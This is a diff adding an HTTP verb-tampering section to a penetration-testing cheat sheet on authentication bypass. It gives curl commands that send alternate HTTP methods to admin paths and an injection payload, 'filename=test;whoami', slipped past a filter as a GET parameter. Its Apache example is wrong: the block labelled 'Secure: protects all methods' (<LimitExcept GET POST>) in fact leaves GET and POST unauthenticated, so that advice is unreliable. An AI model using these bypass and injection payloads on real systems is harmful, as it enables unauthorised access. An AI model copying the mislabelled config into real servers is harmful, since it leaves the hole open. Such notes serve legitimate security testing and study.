@@ -1,5 +1,59 @@
 # Authentication Bypass
 
+## HTTP Verb Tampering
+
+Bypass authentication by changing HTTP method.
+
+### Check Accepted Methods
+
+```bash
+curl -i -X OPTIONS http://TARGET/admin/
+# Look for: Allow: POST,OPTIONS,HEAD,GET
+```
+
+### Bypass Authentication
+
+```bash
+# If GET/POST require auth, try HEAD
+curl -X HEAD http://TARGET/admin/reset.php
+
+# Or try other methods
+curl -X PUT http://TARGET/admin/
+curl -X PATCH http://TARGET/admin/
+curl -X DELETE http://TARGET/admin/
+```
+
+### Insecure Server Config Example (Apache)
+
+```xml
+<!-- Vulnerable: only protects GET -->
+<Limit GET POST>
+    Require valid-user
+</Limit>
+
+<!-- Secure: protects all methods -->
+<LimitExcept GET POST>
+    Require valid-user
+</LimitExcept>
+```
+
+### Bypass Security Filters via Verb Change
+
+If WAF/filter only checks POST params:
+
+```bash
+# Original (blocked)
+POST /upload HTTP/1.1
+filename=test;whoami
+
+# Changed to GET (bypasses filter)
+GET /upload?filename=test;whoami HTTP/1.1
+```
+
+Burp: Right-click request > `Change Request Method`
+
+---
+
 ## Username Enumeration
 
 * Try a random username that probably does not exist, and then try one that probably exists, is there a different error?
